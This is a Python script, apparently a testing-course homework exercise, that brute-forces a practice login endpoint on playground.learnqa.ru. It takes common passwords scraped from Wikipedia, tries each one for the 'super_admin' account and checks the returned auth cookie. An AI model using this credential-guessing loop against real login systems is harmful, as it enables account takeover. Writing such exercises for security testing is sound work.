import requests
from lxml import html

def _get_passwords_from_wiki():
    response = requests.get("https://en.wikipedia.org/wiki/List_of_the_most_common_passwords")
    html_tree = html.fromstring(response.text)
    locator = '//*[contains(text(),"Top 25 most common passwords by year according to SplashData")]//..//td[@align="left"]/text()'
    passwords = html_tree.xpath(locator)
    striped_passwords = list(map(lambda x: str(x).strip(), passwords))
    unique_passwords = list(dict.fromkeys(striped_passwords))
    return unique_passwords

def _get_auth_cookie(login, password):
    params = {"login": login, "password": password}
    response = requests.post("https://playground.learnqa.ru/ajax/api/get_secret_password_homework", data=params)
    return response.cookies.get_dict()["auth_cookie"]


def _validate_cookie(cookie):
    params = {"cookie": cookie}
    response = requests.get("https://playground.learnqa.ru/ajax/api/check_auth_cookie", params=params)
    return response.text == "You are authorized"

login = "super_admin"
passwords = _get_passwords_from_wiki()
success_password_count = 0
failure_password_count = 0

print("\nStart the process of brute force\n")

for password in passwords:
    auth_cookie = _get_auth_cookie(login, password)
    is_validate = _validate_cookie(auth_cookie)

    if is_validate:
        success_password_count += 1
    else:
        failure_password_count += 1

    print("Auth is {}: login = [{}] password = [{}] cookie = [{}]".format(is_validate, login, password, auth_cookie))

print("\nEnd the process of brute force\n"
      "     success password count - {}\n".format(success_password_count) +
      "     failure password count - {}".format(failure_password_count)
)
